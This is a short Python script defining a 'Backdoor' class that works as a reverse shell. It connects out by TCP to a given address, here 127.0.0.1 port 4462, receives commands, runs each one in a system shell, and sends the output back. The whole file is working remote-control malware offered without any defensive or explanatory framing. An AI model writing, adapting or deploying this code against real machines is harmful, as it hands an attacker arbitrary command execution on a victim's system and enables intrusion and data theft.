
import socket, subprocess

class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))
        self.connection.send(b"\n[+] Connection Established.\n")

    def execute_system_command(self, command):
        return subprocess.check_output(command, shell=True)

    def close_connection(self):
        self.connection.close()

    def run(self):
        while True:
            try:
                received_command = self.connection.recv(1024)
                #print(received_data)
                command_result = self.execute_system_command(received_command)
                self.connection.send(command_result)

            except ConnectionResetError:
                pass
    
            except KeyboardInterrupt:
                print("[+] Detected CTRL + C.....Closing App....Please wait...")
                self.connection.close()
                exit()

#class end

my_backdoor = Backdoor("127.0.0.1", 4462)
my_backdoor.run()
my_backdoor.close_connection()